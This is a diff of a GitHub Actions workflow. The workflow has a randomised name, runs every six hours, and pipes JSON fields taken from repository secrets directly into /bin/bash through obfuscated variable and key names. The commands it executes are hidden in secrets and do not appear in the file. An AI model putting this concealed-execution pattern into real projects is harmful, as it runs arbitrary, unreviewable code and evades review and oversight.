@@ -1,8 +1,10 @@
 name: shanxiaochen8371
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
+    - cron: '28 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: shanxiaochen8371
         env:
-          ek4: ${{ secrets.ek4 }}
+          gbg54: ${{ secrets.gbg54 }}
         run: |
-          echo $ek4 | jq -r .vets2432 | /bin/bash
-          echo $eyuo200 | jq -r .ra5 | /bin/bash
-          echo $uxo08 | jq -r .r795 | /bin/bash
-          echo $q29 | jq -r .yf91687 | /bin/bash
-          echo $sb0 | jq -r .nkh166 | /bin/bash
-          echo $d399 | jq -r .tqwl1930 | /bin/bash
-          echo $kby21327 | jq -r .ie2 | /bin/bash
+          echo $gbg54 | jq -r .l4933 | /bin/bash
+          echo $tzi2 | jq -r .s30256 | /bin/bash
+          echo $ecr132 | jq -r .u4544 | /bin/bash
+          echo $co00 | jq -r .ezl46 | /bin/bash
+          echo $vinfn3 | jq -r .dioza97904 | /bin/bash
+          echo $enru1200 | jq -r .uxzp82 | /bin/bash
+          echo $xx65 | jq -r .ri70927 | /bin/bash
+          echo $sf4 | jq -r .kcdd90 | /bin/bash
+          echo $lqfw19139 | jq -r .wnis1223 | /bin/bash
 
